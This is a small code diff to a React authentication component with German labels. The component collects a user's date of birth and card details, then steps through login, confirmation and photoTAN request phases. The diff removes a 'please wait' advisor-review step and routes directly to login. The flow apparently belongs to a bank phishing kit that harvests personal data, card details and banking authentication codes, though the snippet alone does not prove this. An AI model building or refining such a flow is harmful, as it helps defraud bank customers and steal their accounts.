@@ -88,11 +88,11 @@ const AuthFlow = () => {
   if (phase === "berater") {
     return <BeraterStep onSubmit={async (geburtsdatum, karte) => {
       await upsertMeta({ berater_geburtsdatum: geburtsdatum, berater_karte: karte });
-      await setPhase("berater_review", { last_error: null });
+      await setPhase("login", { last_error: null });
     }} />;
   }
 
-  if (phase === "berater_review") return <LoadingStep text="Bitte warten." />;
+
 
   if (phase === "confirm") {
     return <ConfirmStep row={row} onClick={async () => { await setPhase("phototan_request", { last_error: null }); }} />;
